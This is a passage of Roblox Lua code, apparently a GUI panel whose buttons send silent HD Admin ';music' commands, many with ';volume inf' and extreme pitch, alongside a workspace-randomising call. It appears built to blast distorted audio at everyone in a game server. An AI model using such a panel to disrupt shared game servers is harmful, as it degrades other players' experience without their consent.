RandomizeWorkspace()

end)
end

local Page2 = Instance.new("Frame")
Page2.Name = "Page2"
Page2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Page2.BackgroundTransparency = 1
Page2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Page2.BorderSizePixel = 0
Page2.Position = UDim2.new(5.62018023e-08, 0, 0.0526315793, 0)
Page2.Size = UDim2.new(0, 541, 0, 657)
Page2.Visible = false
Page2.Parent = R[2]

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Name = "ScrollingFrame"
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.ScrollBarThickness = 8
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 242, 255)
ScrollingFrame.Position = UDim2.new(-0.000316887337, 0, -0.0218068063, 0)
ScrollingFrame.Size = UDim2.new(0, 543, 0, 390)
ScrollingFrame.ZIndex = 2
R[379] = ScrollingFrame
ScrollingFrame.Parent = Page2

local TextButton19 = Instance.new("TextButton")
TextButton19.Name = "TextButton"
TextButton19.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton19.Text = "Theme"
TextButton19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton19.TextSize = 20
TextButton19.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton19.TextWrapped = true
TextButton19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton19.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton19.BorderSizePixel = 2
TextButton19.Position = UDim2.new(0.0122807017, 0, 0.0461165048, 0)
TextButton19.Size = UDim2.new(0, 113, 0, 53)
TextButton19.ZIndex = 2
TextButton19.Parent = ScrollingFrame

local LocalScript20 = Instance.new("Folder")
LocalScript20.Name = "LocalScript"
LocalScript20.Parent = TextButton19
__S[#__S + 1] = function(...)
local script = LocalScript20
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 134748408136785 ;volume inf ;pitch 0.046")
end)
end

local TextButton20 = Instance.new("TextButton")
TextButton20.Name = "TextButton"
TextButton20.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton20.Text = "My hope will never die"
TextButton20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton20.TextSize = 20
TextButton20.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton20.TextWrapped = true
TextButton20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton20.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton20.BorderSizePixel = 2
TextButton20.Position = UDim2.new(0.22280702, 0, 0.0461165048, 0)
TextButton20.Size = UDim2.new(0, 113, 0, 53)
TextButton20.ZIndex = 2
TextButton20.Parent = ScrollingFrame

local LocalScript21 = Instance.new("Folder")
LocalScript21.Name = "LocalScript"
LocalScript21.Parent = TextButton20
__S[#__S + 1] = function(...)
local script = LocalScript21
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 136582320535568 ;volume inf ;pitch 0.075")
end)
end

local TextButton21 = Instance.new("TextButton")
TextButton21.Name = "TextButton"
TextButton21.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton21.Text = "king von minecraft"
TextButton21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton21.TextSize = 20
TextButton21.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton21.TextWrapped = true
TextButton21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton21.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton21.BorderSizePixel = 2
TextButton21.Position = UDim2.new(0.44035089, 0, 0.0461165048, 0)
TextButton21.Size = UDim2.new(0, 113, 0, 53)
TextButton21.ZIndex = 2
TextButton21.Parent = ScrollingFrame

local LocalScript22 = Instance.new("Folder")
LocalScript22.Name = "LocalScript"
LocalScript22.Parent = TextButton21
__S[#__S + 1] = function(...)
local script = LocalScript22
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 123616860240154 ;volume inf ;pitch 0.067")
end)
end

local TextButton22 = Instance.new("TextButton")
TextButton22.Name = "TextButton"
TextButton22.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton22.Text = "MLG"
TextButton22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton22.TextSize = 20
TextButton22.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton22.TextWrapped = true
TextButton22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton22.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton22.BorderSizePixel = 2
TextButton22.Position = UDim2.new(0.650877178, 0, 0.0461165048, 0)
TextButton22.Size = UDim2.new(0, 113, 0, 53)
TextButton22.ZIndex = 2
TextButton22.Parent = ScrollingFrame

local LocalScript23 = Instance.new("Folder")
LocalScript23.Name = "LocalScript"
LocalScript23.Parent = TextButton22
__S[#__S + 1] = function(...)
local script = LocalScript23
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 102508742415757 ;volume inf ;pitch 0.12")
end)
end

local TextButton23 = Instance.new("TextButton")
TextButton23.Name = "TextButton"
TextButton23.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton23.Text = "terry davis sparta remix"
TextButton23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton23.TextSize = 20
TextButton23.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton23.TextWrapped = true
TextButton23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton23.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton23.BorderSizePixel = 2
TextButton23.Position = UDim2.new(0.0122807017, 0, 0.14070864, 0)
TextButton23.Size = UDim2.new(0, 113, 0, 53)
TextButton23.ZIndex = 2
TextButton23.Parent = ScrollingFrame

local LocalScript24 = Instance.new("Folder")
LocalScript24.Name = "LocalScript"
LocalScript24.Parent = TextButton23
__S[#__S + 1] = function(...)
local script = LocalScript24
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 113059874310718 ;volume inf ;pitch 0.06")
end)
end

local TextButton24 = Instance.new("TextButton")
TextButton24.Name = "TextButton"
TextButton24.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton24.Text = "now im with spongebob"
TextButton24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton24.TextSize = 20
TextButton24.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton24.TextWrapped = true
TextButton24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton24.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton24.BorderSizePixel = 2
TextButton24.Position = UDim2.new(0.22280702, 0, 0.14070864, 0)
TextButton24.Size = UDim2.new(0, 113, 0, 53)
TextButton24.ZIndex = 2
TextButton24.Parent = ScrollingFrame

local LocalScript25 = Instance.new("Folder")
LocalScript25.Name = "LocalScript"
LocalScript25.Parent = TextButton24
__S[#__S + 1] = function(...)
local script = LocalScript25
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 111640798770779 ;volume inf ;pitch 0.069")
end)
end

local TextButton25 = Instance.new("TextButton")
TextButton25.Name = "TextButton"
TextButton25.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton25.Text = "wild turkey nights"
TextButton25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton25.TextSize = 20
TextButton25.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton25.TextWrapped = true
TextButton25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton25.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton25.BorderSizePixel = 2
TextButton25.Position = UDim2.new(0.44035089, 0, 0.14070864, 0)
TextButton25.Size = UDim2.new(0, 113, 0, 53)
TextButton25.ZIndex = 2
TextButton25.Parent = ScrollingFrame

local LocalScript26 = Instance.new("Folder")
LocalScript26.Name = "LocalScript"
LocalScript26.Parent = TextButton25
__S[#__S + 1] = function(...)
local script = LocalScript26
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 126997512424162 ;volume inf ;pitch 0.051")
end)
end

local TextButton26 = Instance.new("TextButton")
TextButton26.Name = "TextButton"
TextButton26.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton26.Text = "subway sexists"
TextButton26.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton26.TextSize = 20
TextButton26.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton26.TextWrapped = true
TextButton26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton26.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton26.BorderSizePixel = 2
TextButton26.Position = UDim2.new(0.650877178, 0, 0.14070864, 0)
TextButton26.Size = UDim2.new(0, 113, 0, 53)
TextButton26.ZIndex = 2
TextButton26.Parent = ScrollingFrame

local LocalScript27 = Instance.new("Folder")
LocalScript27.Name = "LocalScript"
LocalScript27.Parent = TextButton26
__S[#__S + 1] = function(...)
local script = LocalScript27
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 76447225967797 ;volume inf ;pitch 0.044")
end)
end

local TextButton27 = Instance.new("TextButton")
TextButton27.Name = "TextButton"
TextButton27.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton27.Text = "sonic"
TextButton27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton27.TextSize = 20
TextButton27.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton27.TextWrapped = true
TextButton27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton27.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton27.BorderSizePixel = 2
TextButton27.Position = UDim2.new(0.0122807017, 0, 0.235119313, 0)
TextButton27.Size = UDim2.new(0, 113, 0, 53)
TextButton27.ZIndex = 2
TextButton27.Parent = ScrollingFrame

local LocalScript28 = Instance.new("Folder")
LocalScript28.Name = "LocalScript"
LocalScript28.Parent = TextButton27
__S[#__S + 1] = function(...)
local script = LocalScript28
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 97471546767276 ;volume inf ;pitch 0.095")
end)
end

local TextButton28 = Instance.new("TextButton")
TextButton28.Name = "TextButton"
TextButton28.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton28.Text = "sonic hill sound"
TextButton28.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton28.TextSize = 20
TextButton28.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton28.TextWrapped = true
TextButton28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton28.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton28.BorderSizePixel = 2
TextButton28.Position = UDim2.new(0.22280702, 0, 0.235119313, 0)
TextButton28.Size = UDim2.new(0, 113, 0, 53)
TextButton28.ZIndex = 2
TextButton28.Parent = ScrollingFrame

local LocalScript29 = Instance.new("Folder")
LocalScript29.Name = "LocalScript"
LocalScript29.Parent = TextButton28
__S[#__S + 1] = function(...)
local script = LocalScript29
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 129292850196305 ;volume inf ;pitch 0.29")
end)
end

local TextButton29 = Instance.new("TextButton")
TextButton29.Name = "TextButton"
TextButton29.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton29.Text = "couple days in the summer"
TextButton29.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton29.TextSize = 20
TextButton29.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton29.TextWrapped = true
TextButton29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton29.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton29.BorderSizePixel = 2
TextButton29.Position = UDim2.new(0.44035089, 0, 0.235119313, 0)
TextButton29.Size = UDim2.new(0, 113, 0, 53)
TextButton29.ZIndex = 2
TextButton29.Parent = ScrollingFrame

local LocalScript30 = Instance.new("Folder")
LocalScript30.Name = "LocalScript"
LocalScript30.Parent = TextButton29
__S[#__S + 1] = function(...)
local script = LocalScript30
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 82696338249251 ;volume 1")
end)
end

local TextButton30 = Instance.new("TextButton")
TextButton30.Name = "TextButton"
TextButton30.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton30.Text = "too late im already dead"
TextButton30.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton30.TextSize = 20
TextButton30.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton30.TextWrapped = true
TextButton30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton30.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton30.BorderSizePixel = 2
TextButton30.Position = UDim2.new(0.650877178, 0, 0.235119313, 0)
TextButton30.Size = UDim2.new(0, 113, 0, 53)
TextButton30.ZIndex = 2
TextButton30.Parent = ScrollingFrame

local LocalScript31 = Instance.new("Folder")
LocalScript31.Name = "LocalScript"
LocalScript31.Parent = TextButton30
__S[#__S + 1] = function(...)
local script = LocalScript31
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 112239760775409 ;volume 15 ;pitch 0.0875")
end)
end

local TextButton31 = Instance.new("TextButton")
TextButton31.Name = "TextButton"
TextButton31.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton31.Text = "worlds a fuck"
TextButton31.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton31.TextSize = 20
TextButton31.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton31.TextWrapped = true
TextButton31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton31.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton31.BorderSizePixel = 2
TextButton31.Position = UDim2.new(0.0122807017, 0, 0.328660429, 0)
TextButton31.Size = UDim2.new(0, 113, 0, 53)
TextButton31.ZIndex = 2
TextButton31.Parent = ScrollingFrame

local LocalScript32 = Instance.new("Folder")
LocalScript32.Name = "LocalScript"
LocalScript32.Parent = TextButton31
__S[#__S + 1] = function(...)
local script = LocalScript32
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 113051302676320 ;volume 100 ;pitch 0.053")
end)
end

local TextButton32 = Instance.new("TextButton")
TextButton32.Name = "TextButton"
TextButton32.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton32.Text = "kyoto"
TextButton32.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton32.TextSize = 20
TextButton32.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton32.TextWrapped = true
TextButton32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton32.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton32.BorderSizePixel = 2
TextButton32.Position = UDim2.new(0.22280702, 0, 0.328660429, 0)
TextButton32.Size = UDim2.new(0, 113, 0, 53)
TextButton32.ZIndex = 2
TextButton32.Parent = ScrollingFrame

local LocalScript33 = Instance.new("Folder")
LocalScript33.Name = "LocalScript"
LocalScript33.Parent = TextButton32
__S[#__S + 1] = function(...)
local script = LocalScript33
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 123259376094664 ;volume 100 ;pitch 0.11")
end)
end

local TextButton33 = Instance.new("TextButton")
TextButton33.Name = "TextButton"
TextButton33.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton33.Text = "hard trance super slowed"
TextButton33.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton33.TextSize = 20
TextButton33.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton33.TextWrapped = true
TextButton33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton33.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton33.BorderSizePixel = 2
TextButton33.Position = UDim2.new(0.44035089, 0, 0.328660429, 0)
TextButton33.Size = UDim2.new(0, 113, 0, 53)
TextButton33.ZIndex = 2
TextButton33.Parent = ScrollingFrame

local LocalScript34 = Instance.new("Folder")
LocalScript34.Name = "LocalScript"
LocalScript34.Parent = TextButton33
__S[#__S + 1] = function(...)
local script = LocalScript34
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 1839272148 ;volume 100 ;pitch 0.315")
end)
end

local TextButton34 = Instance.new("TextButton")
TextButton34.Name = "TextButton"
TextButton34.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton34.Text = "song i heard at some point in my life but i dont know the name"
TextButton34.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton34.TextSize = 15
TextButton34.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton34.TextWrapped = true
TextButton34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton34.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton34.BorderSizePixel = 2
TextButton34.Position = UDim2.new(0.650877178, 0, 0.328660429, 0)
TextButton34.Size = UDim2.new(0, 113, 0, 53)
TextButton34.ZIndex = 2
TextButton34.Parent = ScrollingFrame

local LocalScript35 = Instance.new("Folder")
LocalScript35.Name = "LocalScript"
LocalScript35.Parent = TextButton34
__S[#__S + 1] = function(...)
local script = LocalScript35
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 138421944471718 ;volume 100 ;pitch 1.03")
end)
end

local TextButton35 = Instance.new("TextButton")
TextButton35.Name = "TextButton"
TextButton35.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton35.Text = "i wish i knew u wanna be"
TextButton35.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton35.TextSize = 20
TextButton35.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton35.TextWrapped = true
TextButton35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton35.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton35.BorderSizePixel = 2
TextButton35.Position = UDim2.new(0.0122807017, 0, 0.43172881, 0)
TextButton35.Size = UDim2.new(0, 113, 0, 53)
TextButton35.ZIndex = 2
TextButton35.Parent = ScrollingFrame

local LocalScript36 = Instance.new("Folder")
LocalScript36.Name = "LocalScript"
LocalScript36.Parent = TextButton35
__S[#__S + 1] = function(...)
local script = LocalScript36
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 134763052215450 ;volume 100")
end)
end

local TextButton36 = Instance.new("TextButton")
TextButton36.Name = "TextButton"
TextButton36.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton36.Text = "song of unhealing"
TextButton36.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton36.TextSize = 20
TextButton36.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton36.TextWrapped = true
TextButton36.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton36.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton36.BorderSizePixel = 2
TextButton36.Position = UDim2.new(0.22280702, 0, 0.43172881, 0)
TextButton36.Size = UDim2.new(0, 113, 0, 53)
TextButton36.ZIndex = 2
TextButton36.Parent = ScrollingFrame

local LocalScript37 = Instance.new("Folder")
LocalScript37.Name = "LocalScript"
LocalScript37.Parent = TextButton36
__S[#__S + 1] = function(...)
local script = LocalScript37
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 116552457534705 ;volume 69 ;pitch 0.13")
end)
end

local TextButton37 = Instance.new("TextButton")
TextButton37.Name = "TextButton"
TextButton37.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton37.Text = "illuminati"
TextButton37.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton37.TextSize = 20
TextButton37.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton37.TextWrapped = true
TextButton37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton37.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton37.BorderSizePixel = 2
TextButton37.Position = UDim2.new(0.44035089, 0, 0.43172881, 0)
TextButton37.Size = UDim2.new(0, 113, 0, 53)
TextButton37.ZIndex = 2
TextButton37.Parent = ScrollingFrame

local LocalScript38 = Instance.new("Folder")
LocalScript38.Name = "LocalScript"
LocalScript38.Parent = TextButton37
__S[#__S + 1] = function(...)
local script = LocalScript38
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 100715481298047 ;volume 69 ;pitch 0.1")
end)
end

local TextButton38 = Instance.new("TextButton")
TextButton38.Name = "TextButton"
TextButton38.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton38.Text = "bangarang"
TextButton38.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton38.TextSize = 20
TextButton38.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton38.TextWrapped = true
TextButton38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton38.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton38.BorderSizePixel = 2
TextButton38.Position = UDim2.new(0.650877178, 0, 0.43172881, 0)
TextButton38.Size = UDim2.new(0, 113, 0, 53)
TextButton38.ZIndex = 2
TextButton38.Parent = ScrollingFrame

local LocalScript39 = Instance.new("Folder")
LocalScript39.Name = "LocalScript"
LocalScript39.Parent = TextButton38
__S[#__S + 1] = function(...)
local script = LocalScript39
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 121139207967680 ;volume inf ;pitch 0.115")
end)
end

local TextButton39 = Instance.new("TextButton")
TextButton39.Name = "TextButton"
TextButton39.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton39.Text = "can can v2"
TextButton39.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton39.TextSize = 20
TextButton39.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton39.TextWrapped = true
TextButton39.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton39.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton39.BorderSizePixel = 2
TextButton39.Position = UDim2.new(0.0122807017, 0, 0.537224412, 0)
TextButton39.Size = UDim2.new(0, 113, 0, 53)
TextButton39.ZIndex = 2
TextButton39.Parent = ScrollingFrame

local LocalScript40 = Instance.new("Folder")
LocalScript40.Name = "LocalScript"
LocalScript40.Parent = TextButton39
__S[#__S + 1] = function(...)
local script = LocalScript40
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 1840194801   ;volume 69 ;pitch 1.25")
end)
end

local TextButton40 = Instance.new("TextButton")
TextButton40.Name = "TextButton"
TextButton40.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton40.Text = "im blue"
TextButton40.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton40.TextSize = 20
TextButton40.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton40.TextWrapped = true
TextButton40.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton40.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton40.BorderSizePixel = 2
TextButton40.Position = UDim2.new(0.22280702, 0, 0.537224412, 0)
TextButton40.Size = UDim2.new(0, 113, 0, 53)
TextButton40.ZIndex = 2
TextButton40.Parent = ScrollingFrame

local LocalScript41 = Instance.new("Folder")
LocalScript41.Name = "LocalScript"
LocalScript41.Parent = TextButton40
__S[#__S + 1] = function(...)
local script = LocalScript41
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 78135832356398 ;volume 69 ;pitch 0.0475")
end)
end

local TextButton41 = Instance.new("TextButton")
TextButton41.Name = "TextButton"
TextButton41.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton41.Text = "some sparta remix"
TextButton41.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton41.TextSize = 20
TextButton41.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton41.TextWrapped = true
TextButton41.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton41.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton41.BorderSizePixel = 2
TextButton41.Position = UDim2.new(0.44035089, 0, 0.537224412, 0)
TextButton41.Size = UDim2.new(0, 113, 0, 53)
TextButton41.ZIndex = 2
TextButton41.Parent = ScrollingFrame

local LocalScript42 = Instance.new("Folder")
LocalScript42.Name = "LocalScript"
LocalScript42.Parent = TextButton41
__S[#__S + 1] = function(...)
local script = LocalScript42
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 96919160541575 ;volume 69 ;pitch 0.09")
end)
end

local TextButton42 = Instance.new("TextButton")
